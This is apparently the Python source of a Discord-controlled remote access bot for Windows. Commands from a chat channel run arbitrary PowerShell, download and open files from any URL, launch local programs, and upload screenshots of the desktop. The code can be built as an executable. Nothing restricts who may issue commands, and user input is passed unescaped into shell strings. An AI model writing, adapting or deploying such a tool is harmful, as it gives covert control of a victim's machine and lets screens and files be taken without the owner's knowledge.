import discord
from discord.ext import commands
import os
import logging
import pyautogui
import datetime
import asyncio
import textwrap
import re
import webbrowser
import sys
import subprocess
from pathlib import Path

# Hardcoded config
TOKEN = ""  # Replace with your bot token
CHANNEL_ID = 69420  # Replace with your channel ID

# Ignore unless you know what you're doing
EXEC_COOLDOWN = 5
MAX_MESSAGE_LENGTH = 1900
MAX_OUTPUT_FOR_MESSAGE = 4000

if getattr(sys, 'frozen', False):
    # If running as exe
    log_path = Path(sys.executable).parent / 'bot.log'
else:
    # If running as script
    log_path = Path(__file__).parent / 'bot.log'

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[
        logging.FileHandler(log_path),
        logging.StreamHandler()
    ]
)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Cooldown tracking
user_cooldowns = {}

@bot.event
async def on_ready():
    logging.info(f"✅ Logged in as {bot.user} (ID: {bot.user.id})")
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        try:
            await channel.send("✅ Bot is now running!")
        except discord.Forbidden:
            logging.warning(f"Missing permission to send messages in channel {CHANNEL_ID}")
    else:
        logging.warning(f"Channel ID {CHANNEL_ID} not found.")

@bot.command()
async def sus(ctx):
    """Opens amogus.io in the default browser"""
    await ctx.send('Opening amogus.io ...')
    try:
        webbrowser.open('https://amogus.io/')
        logging.info("Opened https://amogus.io")
    except Exception as e:
        logging.error(f"Failed to open browser: {e}")
        await ctx.send(f"Failed to open browser: {e}")

def paginate_text(text, max_len=MAX_MESSAGE_LENGTH):
    """Splits text into chunks that fit within Discord's message length limits"""
    lines = text.splitlines(keepends=True)
    chunks = []
    current_chunk = ""
    for line in lines:
        if len(current_chunk) + len(line) > max_len:
            chunks.append(current_chunk)
            current_chunk = line
        else:
            current_chunk += line
    if current_chunk:
        chunks.append(current_chunk)
    return chunks

@bot.command()
async def exec(ctx, *, command: str):
    """Executes a PowerShell command"""
    if not command:
        await ctx.send("❌ Please provide a command to execute.")
        return

    now = datetime.datetime.now()
    last_time = user_cooldowns.get(ctx.author.id)
    if last_time and (now - last_time).total_seconds() < EXEC_COOLDOWN:
        await ctx.send(f"⏳ Please wait before running another command (cooldown {EXEC_COOLDOWN}s).")
        return
    
    user_cooldowns[ctx.author.id] = now

    await ctx.send(f"🖥 Executing PowerShell command:\n```powershell\n{textwrap.shorten(command, width=100)}\n```")

    try:
        process = await asyncio.create_subprocess_shell(
            f'powershell -Command "{command}"',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        stdout, stderr = await process.communicate()
        
        output = ""
        if stdout:
            output += stdout.decode('cp1252', errors='replace')
        if stderr:
            output += stderr.decode('cp1252', errors='replace')
            
        output = output.strip() or "✅ Command executed successfully, but no output."

        timestamp = now.strftime("%Y%m%d_%H%M%S")
        if len(output) > MAX_OUTPUT_FOR_MESSAGE:
            filename = f"output_{ctx.author.id}_{timestamp}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(output)
            await ctx.send(file=discord.File(filename))
            os.remove(filename)
        elif len(output) > MAX_MESSAGE_LENGTH:
            chunks = paginate_text(output)
            for chunk in chunks:
                await ctx.send(f"```powershell\n{chunk}\n```")
                await asyncio.sleep(0.3)
        else:
            await ctx.send(f"```powershell\n{output}\n```")

    except Exception as e:
        logging.error(f"Command execution error: {e}")
        await ctx.send(f"❌ Error: {e}")

@bot.command()
async def open(ctx, url: str):
    """Downloads and optionally opens a file from a URL"""
    url = url.strip('"').strip("'")
    if not re.match(r'^https?://', url):
        await ctx.send("❌ Please provide a valid HTTP/HTTPS URL.")
        return

    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    ext = os.path.splitext(url)[1] or ".dat"
    temp_path = os.path.join(os.getenv("TEMP"), f"downloaded_file_{timestamp}{ext}")

    await ctx.send(f"⬇️ Downloading file from:\n{url}")

    try:
        result = subprocess.run(
            ["powershell", "-Command", f'Invoke-WebRequest "{url}" -OutFile "{temp_path}"'],
            capture_output=True, text=True, timeout=30
        )
        
        if result.returncode != 0:
            await ctx.send(f"❌ Download failed:\n```\n{result.stderr}\n```")
            return

        await ctx.send(f"✅ Downloaded to `{temp_path}`\nOpen file? (Y/N)")

        try:
            reply = await bot.wait_for(
                "message",
                timeout=30,
                check=lambda m: m.author == ctx.author and m.content.lower() in ('y', 'n')
            )

            if reply.content.lower() == 'y':
                os.startfile(temp_path)
                await ctx.send("✅ File opened.")
            else:
                await ctx.send("❌ Open cancelled.")

        except asyncio.TimeoutError:
            await ctx.send("❌ No response received. Operation cancelled.")

    except Exception as e:
        logging.error(f"File operation error: {e}")
        await ctx.send(f"❌ Error: {e}")


@bot.command()
async def ss(ctx):
    """Takes a screenshot and sends it."""
    try:
        screenshot_path = "tempscreenshot.png"
        pyautogui.screenshot(screenshot_path)
        await ctx.send(file=discord.File(screenshot_path))
        os.remove(screenshot_path)
        logging.info("Screenshot taken and sent.")
    except Exception as e:
        logging.error(f"Screenshot error: {e}")
        await ctx.send(f"❌ Failed to take screenshot: {e}")

@bot.command()
async def start(ctx, *, filepath: str):
    """Starts/executes a local file"""
    filepath = filepath.strip('"').strip("'")

    if not os.path.isfile(filepath):
        await ctx.send(f"❌ File not found: `{filepath}`")
        return

    try:
        os.startfile(filepath)
        await ctx.send(f"✅ Started file: `{filepath}`")
    except Exception as e:
        logging.error(f"Start file error: {e}")
        await ctx.send(f"❌ Error starting file: {e}")

if __name__ == "__main__":
    try:
        bot.run(TOKEN)
    except Exception as e:
        logging.error(f"Failed to start bot: {e}")
        if getattr(sys, 'frozen', False):
            # Keep window open if running as exe
            input("Press Enter to exit...")
